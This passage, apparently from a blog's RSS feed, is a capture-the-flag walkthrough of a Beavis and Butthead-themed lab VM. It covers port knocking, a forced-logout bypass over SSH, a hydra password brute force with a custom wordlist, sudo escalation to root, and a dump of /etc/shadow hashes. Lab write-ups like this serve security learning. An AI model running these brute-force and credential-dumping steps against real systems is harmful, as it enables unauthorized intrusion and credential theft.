           MH::: :.:.: MMMM=:::.:.:...:....iM::: ::::::  ::::::LM
          MMMMT.::. ::TM:::::..::::::::.::.IM::::HH:::::::::::.MO
           MM:LM::T:MT.:: .......:....:.:: TMMiXMT.MH:::.::::.:M=
            M:. :::MMi:::MMMM=::::::.::..::=MMMMMMXMH:::.:::::MM
           XMI: :..::=MX  :M::.......:...:::.MXTHM MH:::.: :.XM
           MM XMMI IM    M   ................:: :MIIM:::::::MMO
            MMXXMILM  .ML.= :.:::....:.:..::.:..:::MMT:::::TMM
              MXMLMMMT::.:...:........ ....::.:.=.MMMM:::::MM
              MHM=:: :.:::...::::.:...:.....:: =MMM==Mi::::M
              MM=:::.......:.:.::.:.::...:.: ::  . ::=M:: MM
             MMi:=XMMMi::::...:::::.::.:::::::::..: ::Mi:=MT
            MM=:I::  :iMH==:::::.::.:::::::::::::::.::MT:XMT
           MT=:=MMMMMMM=HM::::.::::::MMT=Mi::::::..:::MI=MM
          M ::::::.=I= .MX:..: ::::.::MX::::.:::.:.  .XMMM
         M:MMMMMMM=.::::  ::.::...:.MMIM::.:::.::..::::M
                 M=:: : ::::.==XMMM:XMMM=:::.::.:.::::.M
                 M=.IMMM )X   M  MMMMMM=:::..::..:::.::M
                 MM  X  MMM:MMMMMMMMM=:::.:.:.. .:.::::M
                  MIMMMMMMMMMMMMMMI::::::::.:::.:...:.:M
                MMMMMMMMMMMMMX:.   .:..::....:...:::.:iM
               MMMMMMMMMMI::::::.:.::...:....:.....:.:=M
           MMMMMMMMMI:::::.:.. :.::.::..........:..:..:M
            M=:  :..::..::.........::.......::.:.....: M
             MMMi::::::.:.:==MMMMMMMMMT:.:.:::..:::..: OM
               MM=::..: OMMMM         MMMT:::....:.::: :M
                M=::::MM                MMI:::........:OM
                 MMMMM                   MMH:::..::MMMMMM
                                          MMMMMMMMMMMMMMM


                     CAN YOU UNDERSTAND MY MESSAGE?!



        eins drei drei sieben
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;knock-thrice:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Thrice&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;eins drei drei sieben&lt;/code&gt; is German for &lt;code&gt;one three three seven&lt;/code&gt;&amp;hellip; &lt;code&gt;1337&lt;/code&gt;, get it ;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 1 3 3 7; nc 192.168.56.103 1337
hitting tcp 192.168.56.103:1
hitting tcp 192.168.56.103:3
hitting tcp 192.168.56.103:3
hitting tcp 192.168.56.103:7
(UNKNOWN) [192.168.56.103] 1337 (?) : Connection refused
root@kali:~# knock -v 192.168.56.103 1 3 3 7; nc 192.168.56.103 1337
hitting tcp 192.168.56.103:1
hitting tcp 192.168.56.103:3
hitting tcp 192.168.56.103:3
hitting tcp 192.168.56.103:7
/iamcornholio/
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl 192.168.56.103/iamcornholio/
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a &lt;code&gt;base64&lt;/code&gt; encoded string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# echo -en &amp;quot;T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK&amp;quot; | base64 -d
Open up SSH: 8888 9999 7777 6666
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;knock-four-ice:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Four-ice?&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 8888 9999 7777 6666; ssh 192.168.56.103
hitting tcp 192.168.56.103:8888
hitting tcp 192.168.56.103:9999
hitting tcp 192.168.56.103:7777
hitting tcp 192.168.56.103:6666
ssh: connect to host 192.168.56.103 port 22: Connection refused
root@kali:~# knock -v 192.168.56.103 8888 9999 7777 6666; ssh 192.168.56.103
hitting tcp 192.168.56.103:8888
hitting tcp 192.168.56.103:9999
hitting tcp 192.168.56.103:7777
hitting tcp 192.168.56.103:6666
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
root@192.168.56.103&#39;s password: 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ssh:e5233222f13543d15163b8fc77c786fb&#34;&gt;SSH&lt;/h2&gt;

&lt;p&gt;It was very nice of it to give us the credentials for &lt;code&gt;butthead&lt;/code&gt;, but we get kicked off straight away.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh butthead@192.168.56.103
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
butthead@192.168.56.103&#39;s password: 
Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Wed Apr  8 16:30:47 2015 from 192.168.56.101
You are only logging in for a split second! What do you do!
Connection to 192.168.56.103 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can get around this by simply placing a shell command to run at the end of the line, e.g:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh butthead@192.168.56.103 id
butthead@192.168.56.103&#39;s password: 
uid=1001(butthead) gid=1001(butthead) groups=1001(butthead)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Of course, invoking &lt;code&gt;/bin/bash&lt;/code&gt; saves a lot of tediousness.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh butthead@192.168.56.103 /bin/bash
butthead@192.168.56.103&#39;s password: 

id
uid=1001(butthead) gid=1001(butthead) groups=1001(butthead)
whoami
butthead

ls -l
total 4
-rw-rw-r-- 1 butthead butthead 67 Mar  3 00:33 nachos

cat nachos
Great job on getting this far.

Can you login as beavis or root ?
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;getting-beavis:e5233222f13543d15163b8fc77c786fb&#34;&gt;Getting Beavis!&lt;/h2&gt;

&lt;p&gt;This portion of the VM took me something like 6 hours!  Getting beavis&amp;rsquo; password was a complete pain &amp;gt;:D&lt;/p&gt;

&lt;p&gt;I figured that the password would be Beavis and Butthead related.  So I used cEWL to pull words from various sources such as Wikipedia and IMDB quote pages.  I ran the wordlist through &lt;code&gt;hydra&lt;/code&gt; but no valid login was found :(&lt;/p&gt;

&lt;p&gt;The final trick was to a) remove all spaces; b) convert all characters to lowercase.&lt;/p&gt;

&lt;p&gt;Eventually&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# hydra -l beavis -P wordlist -f -t 32 192.168.56.103 ssh
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

[22][ssh] host: 192.168.56.103   login: beavis   password: mikejudge
[STATUS] attack finished for 192.168.56.103 (valid pair found)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh beavis@192.168.56.103

beavis@Huhuhhhhhuhuhhh:~$ id; whoami
uid=1000(beavis) gid=1000(beavis) groups=1000(beavis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
beavis
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;root:e5233222f13543d15163b8fc77c786fb&#34;&gt;Root&lt;/h2&gt;

&lt;p&gt;Beavis is a member of the &lt;code&gt;sudo&lt;/code&gt; group, making the escalation a trivial exercise.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;beavis@Huhuhhhhhuhuhhh:~$ sudo -l
[sudo] password for beavis: 
Matching Defaults entries for beavis on Huhuhhhhhuhuhhh:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User beavis may run the following commands on Huhuhhhhhuhuhhh:
    (ALL : ALL) ALL
beavis@Huhuhhhhhuhuhhh:~$ sudo -i

root@Huhuhhhhhuhuhhh:~# cat /etc/shadow
root:$6$iKFfVKIm$TChaO1huLt0YVVUKdQ./4/nPKa7hL96JRDUk0qzBt0Hl9MeYCzZD5cS9qaxxbzif78mX8XiO2seiukv0vPL48/:16497:0:99999:7:::
beavis:$6$vL7Sn7xS$vmqKbPx1nahNiF8YmITZqgXhv89G/aMQSMJOfN5meoOQtcsIAxrlTyC/pUHwoDkWkkq2Umr7HawkiLrnYFqI11:16496:0:99999:7:::
butthead:$6$wl1mxaMt$ginoPx9IAhi6WnJzrhH0bUDDhQVhLPWOvYAaT9Tf2hgauBiOxbNNY8WZMSSg1n0XEkvSoGKvV8EtibKg0AP1Y.:16497:0:99999:7::
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>